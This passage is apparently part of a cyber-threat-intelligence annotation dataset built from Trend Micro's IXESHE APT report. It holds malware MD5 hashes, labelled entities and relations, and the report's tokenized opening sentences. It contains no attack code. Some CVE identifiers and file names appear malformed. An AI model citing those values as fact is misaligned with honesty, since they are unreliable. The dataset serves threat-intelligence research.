["3fd66bcecc804913a016827eba28897a"], ["427259dc60c10ca5586da8d76139cc92"], ["42899a14835c5702af3c2f0abaf64429"], ["4413e592ad3c072fa300f526b83bb644"], ["442c0e4bda0035c34e767d429e7f821b"], ["443ed084c7bb1687825670d0293d3482"], ["453963093fa87f1ecd9be2691d080b0c"], ["45b8270e80fcaa229cfe8e4baf15d9c2"], ["45d07b1a0a6cea3035d448e384b59252"], ["45f565e1b73e723ade1838e2c78867a6"], ["46548ef50b1d64909f77a484bac66de6"], ["46679d05a02e065a5f082d86d7635488"], ["466cbf76ccf76e0a2fb309e9e8433bce"], ["46a9e994658fe49e892c5a5d5740b58a"], ["47bc44ccd673760918c99856a053aca0"], ["48a4a92443dd2595806e9afd76275ea0"], ["48ccdc7a5eec2a0240b28534d501eebb"], ["4943c536c8b06044456af9971a0f54eb"], ["499ad52953d3e12ebcda3f4eec3cad4f"], ["49e0df6cb8abc6d4554829f2cc77ad75"], ["4a828744a96d739815ff40d54bc9d022"], ["4add8281a028c6ea76d369186f787004"], ["4b835d7b89f754f72fa712fd281aa51f"], ["4bb3264ddb68e096bbd11721fea3d2e2"], ["4bc96cf2a63f4bfbc5f24c07329d986d"], ["4cb5033c2b4e19872d2fb98dc9678362"], ["4d84bd418da17f01298df489c251464f"], ["4dc08c921bc81ce89aae397eaa049dda"], ["4f862e38b7db5beebacff59a751b0f59"], ["5098b3d6211a17f315fb33b17e37c9b1"], ["50ecc77c6c831bcd7e0534353f61c479"], ["514c992b5af684efb08ada784f36bce7"], ["57ffbe0560b61ef7da39a29049dfdc45"], ["5b0d5ad64256811a7e8be472f3492d2d"], ["5b382d58d6a890ce696494c304242625"], ["5c26947e42381afa8459b6a91308662e"], ["5c2ebee0d8748e926d015d07c434b409"], ["5c920ea7042f820f46ca8bdeb9a17519"], ["5ccdc66a50b3b101d4038ab23b65196f"], ["5cf7669f0b64b0780159cae4275e75e7"], ["5dbd2ed78f47fd75112b5b8d9a5a2a7d"], ["5f76d78402be896288284c18407957b2"], ["5f84282c7ee466e777665ef72fa258b5"], ["61792bb6aa26ce5e826ee300977825c1"], ["61a605dc9bfcbdc382f528607115b8f1"], ["629dc2675a940e6fd0cfd778f2c3149a"], ["630e9ced15a16aaa464b73481297f40f"], ["63d33065354038eec8b8a386d5bf45bf"], ["6680e19b115c88416b13b5985bf2c32d"], ["66fc71e3f35b3ef21cf524c3be92708c"], ["67ae7ca090aed3841ca1c0ec85d26d2c"], ["687cfc99f09f1cb9b1915135bc57fbbe"], ["68a3e1c03a0ce92a648eea823bfcdd4d"], ["690e6208ccfc960c71175e43c75deee1"], ["6979c05ff1682c6bcff2da5f20350388"], ["69f8825118ea8ab1c671c28298c592aa"], ["6c1fa0a523a751b8d588b75814a46759"], ["6e8994d01ab6837e6baeedbfd9bf45b2"], ["701d95d5d716a726a4316d7352938510"], ["70cf6edb22a2fd5fee7665ad1a260b39"], ["70f167e43ba0c4df744601ace41d29fb"], ["71313fcf3d825ba40375cf62f4777e10"], ["719b1d9e93a6fe2fe0918f029990fbfd"], ["72b9b505ef199fee23db350d6e096340"], ["73802e2bb0c7f821f0959e9a424be35b"], ["744670ca4531f7ceb72a75ae456e8215"], ["74cb2fc990adf24f1da265dd14737d48"], ["7547a4e39ac61eae20c79fa3834d8e2a"], ["7578feae5abb684e691e44a1c82d0b78"], ["7769907450c95de213567408d1c3eb32"], ["79a160fec8c1e34b0188e034dffccfa5"], ["7a1d4cba9ce2a28ef586c27689b5aea7"], ["7a72460b0f3caeaa9a0dd5aa252a3dd5"], ["7bd2cf1a96fe27c301111785799233ea"], ["7c2258469a87138a94eb1a15578df9c1"], ["7c9836391eb08e1cfa33dd1094d2f993"], ["7db483b6dfb3952ce9c29b7bf26e662b"], ["7e0d522932460ea1d9a88a82980b1234"], ["7fd3760a10a79397da3e7f2531a3c165"], ["7fec0946aa04ac5f96c8633565a503a7"], ["80398a1c31cb0fad735d051f22865204"], ["8042b3849217de1ee9181ee9c7338df8"], ["80450d1256eddeece918ef02e9dedcd5"], ["80a8635e966a5fb6924cfd92d18b1829"], ["8198751a915561b30a607b1d2a651f73"], ["81df7dca8b3bb3ae964fa8cfd82de413"], ["81fa811f56247c236566d430ae4798eb"], ["8279af9adb9dcde15f67e4938a32e460"], ["83046fb020b98d6bdc59b6d3135fa293"], ["8330e398c976797e86e23110255774ff"], ["839ead900d516a2fe9ec7dc68c6f91dc"], ["84356ed469c95c1418209bd929640622"], ["84484706048822c4a483d9cdd4ae6136"], ["845f298eeec87f92302146aba04ee108"], ["84a201fa44c3675687ad2b9e3cf0adc1"], ["84b8488ce8d20cab10fe10973429d1b3"], ["84d24967cb5cbacf4052a3001692dd54"], ["85639dd697e36a7eeb7e84e6ddccda46"], ["856de08a947a40e00ea7ed66b8e02c53"], ["858941e84af0d2a102b26497c22265c4"], ["875b9628aee0a7108929ecd57f7e771d"], ["89b61f9100b8135d7356fa864598be7f"], ["89ffcc729bf4b89a298b0dd317228646"], ["8bfc2763ec3141e6215fe9958607b895"], ["8c6d058e3c821ca141cbbbcfe7afe8e8"], ["8ec4fc310915b6db5d62ff476d95fc87"], ["8fbc2220e1f505d3312542ccab2cb103"], ["90506693e1df8190ad657d519551472d"], ["908c8475c451050599909b0212857bbe"], ["90bf1a608159df6c4f11f6366cecb998"], ["912aad79475fd457165b3ae8c362203f"], ["9133dcec65eb468ce226e1fd8accaf4e"], ["923d3c72026a56bb9bc54843a6016854"], ["925cbbd8060770e9175ce0433f03ad81"], ["93cf1393241577797b36d707d4255faa"], ["9604700eb71a14a540ba65429d2f75cd"], ["97769f938619bf888a2750b4f079a134"], ["9883cee2f281ae23c4929e0eba313876"], ["9929a8ba088ec944b07c20e0d38d4355"], ["996cdae702fe1f0b7555764c3f4daadd"], ["99a0e8f84028813def520a9a7791635d"], ["9a09e5acd4050a68ade420fcc79c6c66"], ["9ab8cc0bd5facd7fed939ae8715c0f2f"], ["9ac42be9c350de30415f73471b7ced64"], ["9c909e8f3fdf46d1ab0246218f83dc71"], ["9cc962a7f637aced6117aac78f74bdf5"], ["9d001213c967234aef5207971b3dc084"], ["9d0bc24173b98630f45f6cbb5aef048b"], ["9dda46f5b3be826bf427ad6bbd8171ae"], ["9fe79a8d9901cf773d272b0578c818c7"], ["a03c312ad0309c02e29f3be32738f753"], ["a1a977867a889be58767f3224806aef3"], ["a25a0621c0381bdfe32b3f2ea6975f18"], ["a4cc686615d113aa18e2f984a4d69dc6"], ["a64e9189f49db0c1a1ae53891c8a69ef"], ["a6d45978a7736e6265f0243bb14a4f1d"], ["a6e2d6112100869191f20f49408c9459"], ["a714c1df854f966161192b77ff2f4cd4"], ["a78f479adda756ecea71246b6398ac4b"], ["a83fc05a18e18ba19e93a75ffa6ebd50"], ["a99fb261722f271234c872451512c67f"], ["ab5d5a99c171d3e69490a9a7fbe3645f"], ["ac1d99f4751ae8c28c452ae96d6bc800"], ["ac7eccfce8dd486b830fe85dacaf35e8"], ["ad7f7ce329139ccc252ed75704de2eab"], ["ad92cbb5e3522fc4bfc15732284020d0"], ["adab08e09dec4437be49a9346244375a"], ["addd471dcbff1b125f993343a27819a7"], ["ae4c9c1f16fbe20dd78da605f2091ad3"], ["ae60f66d33259207e54ce03416c10adc"], ["af5d3789bb5220553e7fc0d115be4655"], ["b2c52b2078060c0d8dfe3f9c84ab0f1a"], ["b60c862f6435247c21c7d2d05d804248"], ["b9685cc3d0069135696fe51fd7258aac"], ["ba2532bc122c881bfe4ddc39da1dfdf4"], ["ba3324571e0f962e4d6aced7832f4d3f"], ["bdfb76d4dd25ee3b4d36172a3c3cd98e"], ["be7d72c4bb76831089176dd90188ad3e"], ["bf0ad3625fd7cd2c8a7ba3fa74bf1605"], ["bf35c5cb6763679914f267be25a54601"], ["c0c04f41a823cdb4055b109dbadddd18"], ["c1a8179ef14ae95d809179185bcc269f"], ["c1ab14ce4612256bfc93c7b97e5f8353"], ["c2b975caad371568904a04bbb9bf6e17"], ["c3053ece751f9c0b2595a6d9350f48cf"], ["c39183372160e75c7083a5c9eac68124"], ["c3bac79122923eac3f1fd48c5775465d"], ["c47fe9b7a3b72937adeb665432aeeff5"], ["c4a6b6cf35ebed6d46eb5728a6247448"], ["c524005b6f98f5428c228a9577e20f91"], ["c576be490ae4b095149114b34c96c6a9"], ["c5da1da605a6bfc4bf99721e6d665b8d"], ["c6e5277717d0aa2ecd96e9ca06b195d1"], ["c729c36ad0e32be7b23ad022ab8de27c"], ["c7a7c668d4e5c80605bac305799d6ff2"], ["c8a1c24bcd91ca21e89888e418153472"], ["cd5ecadb214f3697d3c77e42c80aff71"], ["d030c4df015cff67353065c0f7198058"], ["d0b9b5889b3bc49ce4c4f942eef7e39f"], ["d0d614ca7bf6745ad52910da8a672e1c"], ["d1568b36e55fae5eb1b7a2ae3b9294f3"], ["d1f641b6dd8861598af23557a7a52a3b"], ["d414ce56e89e1db9df28c3dd388a8249"], ["d415b7a5d328e32a0c383ce3889468af"], ["d4baba6857f3682eeb8ae6f83cc9a271"], ["d4f1188e75c55444a191649c4b4e1362"], ["d541a9cca5288876676aae2ab962997f"], ["d57379739354b204898149b456e732b3"], ["d68d241572a8ffdc8a2e481c96baacfb"], ["d837313adef94c3b173e0a9128896250"], ["d84ecca01839642a27d29f885b885ff1"], ["d8815fe64eb5321add412554908da28a"], ["d8ca81ee8327d8314121d1560800674c"], ["d8f21a32f7d33b1b6b5e948029410eb4"], ["db3d36f3f8386f993a89c9bba25cbeaa"], ["dd260e8a5462304621001dd3c12e4aa8"], ["ddedcf6f543104a3485406d66068e263"], ["dec5441851026a66a4ff0cfd008983c0"], ["df87fe27fcda6906ae248663e0c62861"], ["dfa055d94e59afa791b0f99ff82b54a6"], ["e0417547ba54b58bb2c8f795bca0345c"], ["e1833932053171da15c60e6c2fca708a"], ["e21c8e1c3e79d669f13f771dbbe0eb77"], ["e22632b517305aab6ba9691507d1d562"], ["e31912492ef1edae863b34a96d8c529e"], ["e38d44d1a226b9c1ca70a3e78beaf735"], ["e3ead43315bcc851656805922309744f"], ["e5d96aa540dd934aec72dcecafd366b8"], ["e5ea0c7a48967202f25fc96d91a1a2cb"], ["e61b128e97a39fe869cf89be571fe021"], ["e691dc42a002e9f48f69cd33b70d8a15"], ["e7f5a93eb76bab40d4aa088fba115aaf"], ["e7f93c894451ef1fdefa81c6b229852c"], ["e8664b135b6d681c812aa04ba14a120c"], ["e875d971524d45c10cf332ebf7256688"], ["eb0e2d5ebf6f3dbb4510b85c30a9751d"], ["eb1dc493f005059c654817d153f7ee74"], ["edbc569b5b5824a53721b71ad325a212"], ["edfcb5ec135c94b77e4b94c2a82863b7"], ["ee3ac02b6ca3d6c9012604d71017058f"], ["eebfa7677dedd10edf4aca985f16284c"], ["f03594793c06a097e4b1ac7e1d7079b8"], ["f09e2e3a57d336cb65acab2bdd6b9d14"], ["f1bb8a80e23b6c90004d97c7ef2d0454"], ["f2627bf17528011130e5818bfac0afdb"], ["f2a405326747245e5db97c60e878660b"], ["f34195a2317bf079844bc44c92297cae"], ["f36007400f0c85784fd374ad4ed23c6e"], ["f362f47eb844f889bafd5a0e92c7cdf0"], ["f3b95dad321a14500154e13cf3fbefe4"], ["f3d302a8c56ea86d429157fde1793210"], ["f50406b902601b005c1908a048489ca2"], ["f50fa07be0222baffff05b23fdfd5b68"], ["f5b65b971509eefa009d032003410faf"], ["f77aff1d1c0d94cc96828fb88f3280f3"], ["f7e3b90592c75a6c3c15336d34d97a9e"], ["f9e64eba7185c266786857d7f933577b"], ["fa3f412be4ebf45f478135221365dda7"], ["fa7641771280db462f088d8353dbcfbd"], ["fb11225f453365af4958f98bde2ce918"], ["fc5364e8274a2eb8310d2528d78ac07e"], ["fe4d6a3428cd9f87d5a7044d733d2299"], ["ff271c14549b133a4475ad6615e894da"], ["MD5", "signatures", "for", "RegSubDat"], ["01355596ec3596aa02b8c5f9f1adb5d6"], ["030d492c8d12434144f9b1dc97928cb8"], ["0434ae7b8267b08bd1c6ae17d6100353"], ["048a3815cbf0b8dc9b4c3f680fcd913f"], ["06054346974f309e1003faabac0d1dd5"], ["0836b4a02971aaef33905a91799063ed"], ["09e372c29e69e1edd29f02d4e660d33f"], ["0cafb41eca73d768091bc93f4343cbb9"], ["1050edb8cc0a073991bc637d590d89cc"], ["12954f97e5db1cc86ecfe12be2ec7323"], ["18f9d0973e60b13e7e28d0997e3a09e0"], ["237d641b8267867b007ec94e0bbeff1a"], ["2f6257eab8d3393ac6a96c490f1455ee"], ["351f1ee0cc65d004d40183a7fb6ce616"], ["36310e65b35780242d326f3f604b4c3f"], ["3da70425c099ad4c050eaa4c3308d0cf"], ["48c2d771e3083267a4f9e359ef0e53e5"], ["49b7bc9ac3800caa49bca0a4b3350dbd"], ["4ae7ac0060b938c50675ee2627e3c66d"], ["52856c1a0c63509bf6c00ef1e9fca03c"], ["58cde4ee026df987340a63cfc2c34318"], ["5d53c97b800ca1519800b872bc3f9edf"], ["5d88a3f713c610364fbf750f24af8257"], ["646abf38720c7301698c32bec62d84ce"], ["67d14ce17d3dab4a00d073b6315efc94"], ["69f8d66ccd7fc63ee3f8a3e4f7d86f07"], ["7019e8a17360a583931fb0908f31a2e2"], ["7f7bf881da34242dd1927fda745812f1"], ["81433a87eac3af2227623bf3239844de"], ["83976d6937ebf841999f10bee38ab252"], ["8b1c6478d620bfafbb2c5402d1f926c0"], ["91c3ec270cca27a3785ac827a336c050"], ["94d75acfc4c82c6e48e68b513ade057c"], ["992fa71f3b5e4b1ca3a43d5b2a69e1c0"], ["9a7f048e0e0d0f5bf117f19caef2db1f"], ["9aa7d5ede53be461ab8c4d68fcaa50ab"], ["9ec7da6881d2632a2e823176e915634b"], ["9ef570a298116ac810fdde31a64c7631"], ["a33ab32eeb02b677f9f2786dc3c0651c"], ["a3a1ea2c99d40620fc8dee0222228f24"], ["a876acf60d6e4c4da1123fc11f01ced7"], ["aa90c8e524edb644286c5c0f6c5de987"], ["af0aa267ced776b99a7d157294ac59ba"], ["afd476bbc24a7f20afb017f6869fda65"], ["b5b51dc06c3e9104fa59642952e69d49"], ["b6352cc6e269277960a8da7c5f0306cd"], ["c5860171f919761db9ee78ef3dac5ab4"], ["c6a8c1cdeff0745427aafc588db9c59f"], ["caf90ceece7242bb1147019daf14598f"], ["cc683fc365ec57eea4bc8e1f80a66413"], ["ce47cb6268087cf5c27d77259496989c"], ["cff8e4eb16d010bcc33ad19eb807bd27"], ["d408c2e627b3a895868bf16a3b228eac"], ["dcb3b9ea717603bf6f42e7ce61ea3728"], ["dd1e6b39afcba13b3df3eae13f26d888"], ["e2aa3ca52b8ea17c4bb80d294fec8ec5"], ["e78cc8790ff97eb13d448c15f3f3acae"], ["ea20365eb2142afb4ab9a124808cb8c6"], ["ecf15cce8bd4d6907d86ccff932b64af"], ["ef80d287bd10af3b1cab06d01795ae1a"], ["f5437d13428440412cbf5522adb25f8f"], ["f9d2fec1684529f580785dda5820b372"]]}], [{"vertexSet": [{"old_id": "T1", "type": "Organization", "name": "Trend Micro", "sent_id": null, "pos": []}, {"old_id": "T2", "type": "Attacker", "name": "APTs", "sent_id": null, "pos": []}, {"old_id": "T3", "type": "Campaign", "name": "Luckycat1", "sent_id": 50, "pos": []}, {"old_id": "T4", "type": "Campaign", "name": "Lurid2", "sent_id": 50, "pos": []}, {"old_id": "T5", "type": "Attacker", "name": "IXESHE", "sent_id": 52, "pos": []}, {"old_id": "T6", "type": "ExploitTargetObject", "name": "East Asian governments", "sent_id": 55, "pos": []}, {"old_id": "T7", "type": "ExploitTargetObject", "name": "electronics manufacturers", "sent_id": null, "pos": []}, {"old_id": "T9", "type": "Campaign", "name": "IXESHE", "sent_id": 58, "pos": []}, {"old_id": "T8", "type": "Exploit", "name": "targeted emails", "sent_id": 58, "pos": []}, {"old_id": "T10", "type": "Exploit", "name": "zero-day", "sent_id": 66, "pos": []}, {"old_id": "T11", "type": "Time", "name": "2009", "sent_id": 66, "pos": []}, {"old_id": "T12", "type": "Time", "name": "2011", "sent_id": 66, "pos": []}, {"old_id": "T13", "type": "Attacker", "name": "IXESHE", "sent_id": 64, "pos": []}, {"old_id": "T14", "type": "Exploit", "name": "dynamic Domain Name System", "sent_id": 80, "pos": []}, {"old_id": "T15", "type": "Attacker", "name": "IXESHE", "sent_id": 69, "pos": []}, {"old_id": "T16", "type": "ExploitTargetObject", "name": "A telecommunications company", "sent_id": 99, "pos": []}, {"old_id": "T17", "type": "Campaign", "name": "IXESHE", "sent_id": 93, "pos": []}, {"old_id": "T18", "type": "Time", "name": "July 2009", "sent_id": 108, "pos": []}, {"old_id": "T19", "type": "Attacker", "name": "IXESHE", "sent_id": 105, "pos": [3]}, {"old_id": "T20", "type": "Software", "name": "Adobe Acrobat", "sent_id": 115, "pos": []}, {"old_id": "T21", "type": "Software", "name": "Reader", "sent_id": null, "pos": []}, {"old_id": "T22", "type": "Software", "name": "Flash Player", "sent_id": 116, "pos": []}, {"old_id": "T23", "type": "Vulnerability", "name": "CVE-2009-43243", "sent_id": null, "pos": []}, {"old_id": "T24", "type": "Vulnerability", "name": "CVE-2009-09274", "sent_id": 118, "pos": []}, {"old_id": "T25", "type": "Vulnerability", "name": "CVE-2011-06095", "sent_id": 118, "pos": []}, {"old_id": "T26", "type": "Vulnerability", "name": "CVE-2011-06116", "sent_id": 118, "pos": []}, {"old_id": "T27", "type": "Vulnerability", "name": "CVE-2011-06098", "sent_id": 120, "pos": []}, {"old_id": "T28", "type": "Malware", "name": "IXESHE", "sent_id": 109, "pos": []}, {"old_id": "T29", "type": "Malware", "name": "IXESHE", "sent_id": 123, "pos": [1]}, {"old_id": "T30", "type": "Software", "name": "Microsoft Excel", "sent_id": 124, "pos": []}, {"old_id": "T31", "type": "Vulnerability", "name": "CVE-2009-31299", "sent_id": 124, "pos": []}, {"old_id": "T32", "type": "Exploit", "name": "targeted email with a PDF", "sent_id": 150, "pos": []}, {"old_id": "T33", "type": "Campaign", "name": "IXESHE", "sent_id": 148, "pos": []}, {"old_id": "T34", "type": "Exploit", "name": "XLS exploit", "sent_id": 151, "pos": []}, {"old_id": "T35", "type": "File", "name": "winhlpsexe", "sent_id": 172, "pos": []}, {"old_id": "T36", "type": "File", "name": "acrotryexe", "sent_id": 172, "pos": []}, {"old_id": "T37", "type": "File", "name": "AcroRd32exe", "sent_id": null, "pos": []}, {"old_id": "T38", "type": "File", "name": "Updaterexe", "sent_id": null, "pos": []}, {"old_id": "T39", "type": "Indicator", "name": "Adobe Assistant", "sent_id": 183, "pos": []}, {"old_id": "T40", "type": "Indicator", "name": "Migrated", "sent_id": 183, "pos": []}, {"old_id": "T41", "type": "Malware", "name": "IXESHE", "sent_id": null, "pos": []}, {"old_id": "T42", "type": "Indicator", "name": "launchlnk", "sent_id": null, "pos": []}, {"old_id": "T43", "type": "File", "name": "FGKDjsp", "sent_id": null, "pos": []}, {"old_id": "T44", "type": "File", "name": "FPKjsp", "sent_id": 205, "pos": []}, {"old_id": "T45", "type": "TechnologyInformation", "name": "Computer name", "sent_id": null, "pos": []}, {"old_id": "T46", "type": "NetworkInformation", "name": "Local IP address", "sent_id": 214, "pos": []}, {"old_id": "T47", "type": "NetworkInformation", "name": "Proxy server IP and port", "sent_id": null, "pos": []}, {"old_id": "T48", "type": "Campaign", "name": "AES", "sent_id": 334, "pos": []}, {"old_id": "T49", "type": "Malware", "name": "AWS12345jsp", "sent_id": 340, "pos": []}, {"old_id": "T50", "type": "Indicator", "name": "http://[C&C Server]/[ACD] ES[Some Numbers]jsp", "sent_id": null, "pos": []}, {"old_id": "T51", "type": "Indicator", "name": "AES", "sent_id": 352, "pos": []}, {"old_id": "T52", "type": "Indicator", "name": "DES", "sent_id": 352, "pos": []}, {"old_id": "T53", "type": "Indicator", "name": "PES", "sent_id": 353, "pos": []}, {"old_id": "T54", "type": "Indicator", "name": "SEU", "sent_id": 354, "pos": []}, {"old_id": "T55", "type": "Indicator", "name": "SUS", "sent_id": 354, "pos": []}, {"old_id": "T56", "type": "Indicator", "name": "ZES", "sent_id": 357, "pos": []}, {"old_id": "T57", "type": "Country", "name": "Taiwan", "sent_id": 370, "pos": []}, {"old_id": "T58", "type": "Country", "name": "United States", "sent_id": null, "pos": []}, {"old_id": "T59", "type": "Campaign", "name": "IXESHE", "sent_id": 369, "pos": []}, {"old_id": "T60", "type": "Address", "name": "xxxxx11487", "sent_id": null, "pos": []}, {"old_id": "T61", "type": "Location", "name": "Guangdong", "sent_id": null, "pos": []}, {"old_id": "T62", "type": "Country", "name": "China", "sent_id": 411, "pos": []}, {"old_id": "T63", "type": "Exploit", "name": "HTran", "sent_id": 412, "pos": []}, {"old_id": "T64", "type": "AttackerGroup", "name": "HUC", "sent_id": 416, "pos": []}, {"old_id": "T65", "type": "Campaign", "name": "manufact", "sent_id": 442, "pos": []}, {"old_id": "T66", "type": "Software", "name": "Microsoft XP", "sent_id": 447, "pos": []}, {"old_id": "T67", "type": "SourceCodeInformation", "name": "C++", "sent_id": 451, "pos": []}, {"old_id": "T68", "type": "MalwareCharacteristics", "name": "PDF files", "sent_id": 472, "pos": []}, {"old_id": "T69", "type": "Malware", "name": "IXESHE", "sent_id": 467, "pos": []}, {"old_id": "T70", "type": "MalwareCharacteristics", "name": "targeted email", "sent_id": 470, "pos": []}, {"old_id": "T71", "type": "MalwareCharacteristics", "name": "dynamic DNS services", "sent_id": 483, "pos": []}, {"old_id": "T72", "type": "MalwareCharacteristics", "name": "HTran", "sent_id": 757, "pos": []}, {"old_id": "T73", "type": "Malware", "name": "IXESHE", "sent_id": 753, "pos": []}, {"old_id": "T74", "type": "CourseOfAction", "name": "solid patch management", "sent_id": 768, "pos": []}, {"old_id": "T75", "type": "CourseOfAction", "name": "endpoint and network security", "sent_id": null, "pos": []}, {"old_id": "T76", "type": "CourseOfAction", "name": "firewall use", "sent_id": 769, "pos": []}, {"old_id": "T77", "type": "CourseOfAction", "name": "DLP", "sent_id": null, "pos": []}, {"old_id": "T78", "type": "CourseOfAction", "name": "Enhanced visibility", "sent_id": 783, "pos": []}, {"old_id": "T79", "type": "CourseOfAction", "name": "Integrity checks", "sent_id": null, "pos": []}, {"old_id": "T80", "type": "CourseOfAction", "name": "Empowering the human analyst", "sent_id": null, "pos": []}, {"old_id": "T81", "type": "Software", "name": "Deep Discovery", "sent_id": null, "pos": []}], "labels": [{"old_id": "R1", "r": "P27", "h": 7, "t": 5, "evidence": []}, {"old_id": "R2", "r": "P27", "h": 7, "t": 6, "evidence": []}, {"old_id": "R3", "r": "P22", "h": 7, "t": 8, "evidence": [58]}, {"old_id": "R4", "r": "P22", "h": 7, "t": 9, "evidence": [58, 59, 60, 61, 62, 63, 64, 65, 66]}, {"old_id": "R5", "r": "P33", "h": 12, "t": 10, "evidence": [64, 65, 66]}, {"old_id": "R6", "r": "P33", "h": 12, "t": 11, "evidence": [64, 65, 66]}, {"old_id": "R7", "r": "P23", "h": 14, "t": 13, "evidence": [69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80]}, {"old_id": "R8", "r": "P27", "h": 16, "t": 15, "evidence": [93, 94, 95, 96, 97, 98, 99]}, {"old_id": "R9", "r": "P33", "h": 18, "t": 17, "evidence": [105, 106, 107, 108]}, {"old_id": "R10", "r": "P7", "h": 27, "t": 22, "evidence": []}, {"old_id": "R11", "r": "P7", "h": 27, "t": 23, "evidence": [109, 110, 111, 112, 113, 114, 115, 116, 117, 118]}, {"old_id": "R12", "r": "P7", "h": 27, "t": 24, "evidence": [109, 110, 111, 112, 113, 114, 115, 116, 117, 118]}, {"old_id": "R13", "r": "P7", "h": 27, "t": 25, "evidence": [109, 110, 111, 112, 113, 114, 115, 116, 117, 118]}, {"old_id": "R14", "r": "P7", "h": 28, "t": 26, "evidence": []}, {"old_id": "R15", "r": "P19", "h": 29, "t": 30, "evidence": [124]}, {"old_id": "R16", "r": "P22", "h": 32, "t": 31, "evidence": [148, 149, 150]}, {"old_id": "R17", "r": "P22", "h": 32, "t": 33, "evidence": [148, 149, 150, 151]}, {"old_id": "R18", "r": "P21", "h": 39, "t": 40, "evidence": []}, {"old_id": "R19", "r": "P21", "h": 38, "t": 40, "evidence": []}, {"old_id": "R20", "r": "P21", "h": 41, "t": 40, "evidence": []}, {"old_id": "R21", "r": "P21", "h": 49, "t": 48, "evidence": []}, {"old_id": "R22", "r": "P32", "h": 58, "t": 56, "evidence": [369, 370]}, {"old_id": "R23", "r": "P32", "h": 58, "t": 57, "evidence": []}, {"old_id": "R24", "r": "P13", "h": 68, "t": 67, "evidence": [467, 468, 469, 470, 471, 472]}, {"old_id": "R25", "r": "P13", "h": 68, "t": 69, "evidence": [467, 468, 469, 470]}, {"old_id": "R26", "r": "P13", "h": 68, "t": 70, "evidence": [467, 468, 469, 470, 471, 472, 473, 474, 475, 476, 477, 478, 479, 480, 481, 482, 483]}, {"old_id": "R27", "r": "P13", "h": 72, "t": 71, "evidence": [753, 754, 755, 756, 757]}], "title": ["inputs/txt/201205TrendMicroIXESHE"], "sents": [["Trend", "Micro", "Incorporated"], ["Research", "Paper"], ["2012"], ["IXESHE"], ["An", "APT", "Campaign"], ["By:", "David", "Sancho", ",", "Jessa", "dela", "Torre", ",", "Matsukawa", "Bakuei", ","], ["Nart", "Villeneuve", ",", "and", "Robert", "McArdle"], ["PAGE", "ii", "|", "IXESHE"], ["CONTENTS"], ["Introduction", "", ".", "...................................................................................", "1"], ["Victims", "and", "Targets", "", ".", "..............................................................", "1"], ["Context", ".", ".....................................................................................", "1"], ["Attack", "Vectors", ".", ".......................................................................", "2"], ["Operations", "", ".", ".............................................................................", "2"], ["Technical", "Analysis", ".", "........................................................................", "2"], ["Initial", "Delivery", "Method", ".", "........................................................", "2"], ["Malware", "Local", "System", "Effects", ".", "...........................................", "2"], ["C&C", "Communications", ".", "..........................................................", "3"], ["Related", "AES", "Campaign", "", ".", ".......................................................4"], ["C&C", "Infrastructure", ".", ".......................................................................5"], ["Real", "C&C", "Location", ".", "................................................................6"], ["Attribution", "and", "Unique", "Fingerprints", ".", ".......................................", "7"], ["Unique", "Fingerprints", "and", "Modus", "Operandi", "", ".", ".....................", "7"], ["Relationships", "Between", "Attack", "Components", "", ".", ".........................8"], ["Timeline", ".", ".........................................................................................12"], ["Conclusion", ".", "....................................................................................15"], ["Defending", "Against", "APTs", ".", "............................................................15"], ["Local", "and", "External", "Threat", "Intelligence", "", ".", "..........................15"], ["Mitigation", "and", "Cleanup", "Strategy", ".", ".....................................16"], ["Educating", "Employees", "Against", "Social", "Engineering", ".", "......16"], ["Data-Centric", "Protection", "Strategy", ".", "....................................16"], ["Trend", "Micro", "Threat", "Protection", "Against", "IXESHE"], ["Campaign", "Components", "", ".", ".............................................................17"], ["PAGE", "1", "|", "IXESHE"], ["INTRODUCTION"], ["The", "number", "of", "targeted", "attacks", "is", "undoubtedly", "on", "the"], ["rise", ".", "These", "highly", "targeted", "attacks", "focus", "on", "individual"], ["organizations", "in", "an", "effort", "to", "extract", "valuable", "information", "."], ["In", "many", "ways", ",", "this", "is", "a", "return", "to", "the", "\u201cold", "hacking", "days\u201d"], ["before", "more", "widespread", "attacks", "targeting", "millions", "of"], ["users", "and", "the", "rise", "of", "computer", "worms", "came", "about", "."], ["Sometimes", ",", "these", "targeted", "attacks", "are", "allegedly", "linked", "to"], ["state-sponsored", "activities", "but", "may", "also", "be", "carried", "out", "by"], ["individual", "groups", "with", "their", "own", "goals", "."], ["Trend", "Micro", "continues", "to", "track", "and", "analyze", "highly"], ["targeted", "attacks", ",", "also", "known", "as", "\u201cadvanced", "persistent"], ["threats", "(APTs)", ".", "\u201d", "We", "have", ",", "in", "fact", ",", "published", "two", "research"], ["papers", "on", "the", "Luckycat1"], ["and", "Lurid2"], ["campaigns", ".", "This"], ["research", "paper", "will", "delve", "into", "another", "prominent", "group", "of"], ["attackers", "referred", "to", "as", "\u201cIXESHE\u201d", "(pronounced", "\u201ci-sushi\u201d)", ","], ["based", "on", "one", "of", "the", "more", "common", "detection", "names"], ["security", "companies", "use", "for", "the", "malware", "they", "utilize", ".", "This"], ["campaign", "is", "notable", "for", "targeting", "East", "Asian", "governments", ","], ["electronics", "manufacturers", ",", "and", "a", "telecommunications"], ["company", "."], ["The", "IXESHE", "campaign", "makes", "use", "of", "targeted", "emails", "with"], ["malicious", "attachments", "to", "compromise", "victims\u2019", "systems", "."], ["The", "emails", "are", "often", "tailored", "for", "specific", "victims", "and"], ["contain", "malicious", "attachments", "that", "are", "almost", "always"], ["\u201cweaponized\u201d", "", ".", "PDF", "files", "with", "known", "exploits", "that", "drop"], ["malware", "executables", "onto", "targeted", "systems", ".", "In", "addition", ","], ["the", "IXESHE", "attackers", "conducted", "two", "specific", "attacks", "that"], ["leveraged", "zero-day", "exploits\u2014one", "in", "2009", "and", "another", "in"], ["2011", "."], ["1", "http://www", ".", "trendmicro.com/cloud-content/us/pdfs/securityintelligence/white-papers/wp_luckycat_redux.pdf"], ["2", "http://www", ".", "trendmicro.com/cloud-content/us/pdfs/securityintelligence/white-papers/wp_dissecting-lurid-apt.pdf"], ["The", "IXESHE", "attackers", "almost", "always", "make", "use", "of"], ["compromised", "servers", "as", "command-and-control", "(C&C)"], ["servers", ".", "In", "some", "cases", ",", "the", "compromised", "servers", "are"], ["hosted", "on", "target", "organizations\u2019", "networks", "after", "successful"], ["infiltration", "so", "the", "attackers", "can", "increase", "their", "control"], ["of", "the", "victims\u2019", "infrastructure", ".", "Using", "this", "approach", ",", "the"], ["attackers", "amassed", "at", "least", "60", "C&C", "servers", "over", "time", "."], ["This", "technique", "also", "allows", "the", "attackers", "to", "cover", "their"], ["tracks", ",", "as", "having", "the", "C&C", "server", "in", 